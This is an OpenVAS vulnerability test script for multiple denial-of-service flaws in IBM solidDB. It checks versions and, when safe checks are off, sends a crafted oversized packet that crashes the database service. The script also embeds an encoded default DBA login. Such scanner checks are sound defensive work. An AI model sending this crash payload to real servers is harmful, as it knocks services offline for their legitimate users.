###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ibm_soliddb_44158.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# IBM solidDB Multiple Denial of Service Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100861");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-10-19 12:49:22 +0200 (Tue, 19 Oct 2010)");
  script_bugtraq_id(44158);
  script_cve_id("CVE-2010-4055", "CVE-2010-4056", "CVE-2010-4057");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("IBM solidDB Multiple Denial of Service Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/44158");
  script_xref(name:"URL", value:"http://www.solidtech.com/en/products/relationaldatabasemanagementsoftware/embed.asp");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv.htm");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_ibm_soliddb_detect.nasl");
  script_require_ports("Services/soliddb", 1315);
  script_tag(name:"summary", value:"IBM solidDB is prone to multiple denial-of-service vulnerabilities.

Attackers can exploit these issues to crash the affected application,
denying service to legitimate users.

solidDB 6.5.0.3 is vulnerable, other versions may also be affected.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("byte_func.inc");
include("version_func.inc");

port = get_kb_item("Services/soliddb");
if(!port)port=1315;
if(!get_port_state(port))exit(0);


function soliddb_alive() {

  local_var soc1;

  user = "DBA";
  pass = raw_string(0x76, 0xce, 0xa5, 0x2d, 0x72, 0x4f, 0x6f, 0x02);
  tcp = string("tcp ", get_host_name(), " ", port);
  id = string("OpenVAS (", this_host(), ")");

  soc1 = open_sock_tcp(port);
  if(!soc1)return FALSE;

  set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

  req = raw_string(0x02, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00) + mkdword(1) +
        mkdword(strlen(tcp)) + tcp + mkdword(strlen(user)) + user +
        mkdword(strlen(pass)) + pass + mkdword(4) + mkdword(3) +
        mkdword(2) + mkdword(1) + mkdword(1) + mkdword(0) +
        mkdword(strlen(id)+3) + raw_string(0x04) + mkword(strlen(id)) + id;

  send(socket:soc1, data:req);

  ret = recv(socket:soc1, length:128);
  close(soc1);
  if(!ret || isnull(ret))return FALSE;

  if((strlen(ret) == 35 || strlen(ret) >= 27) && hexstr(substr(ret, 0, 6)) == "02000100000000" && hexstr(substr(ret, 6, 7)) == "0001") {

    return TRUE;

  }

  return FALSE;

}

if(!soliddb_alive())exit(0);

if(safe_checks()) {

  if(!v = get_kb_item(string("soliddb/",port,"/version")))exit(0);

  if("Build" >< v) {
    version = eregmatch(pattern:"^[^ ]+", string:v);
    version = version[0];
  } else {
    version = v;
  }

  if(version_is_less_equal(version:version, test_version:"6.5.0.3")) {
    security_message(port:port);
    exit(0);
  }


} else {

  req = raw_string(0x02,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                   0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00);

  for(i=0;i<20000;i++) {
    req += raw_string(0x00,0xfc,0x3a,0x00);
  }

  req += raw_string(0x00);

  soc = open_sock_tcp(port);
  if(!soc)exit(0);

  send(socket:soc, data:req);
  close(soc);
  sleep(5);

  if(!soliddb_alive()) {
    security_message(port:port);
    exit(0);
  }

exit(0);

}

exit(0);
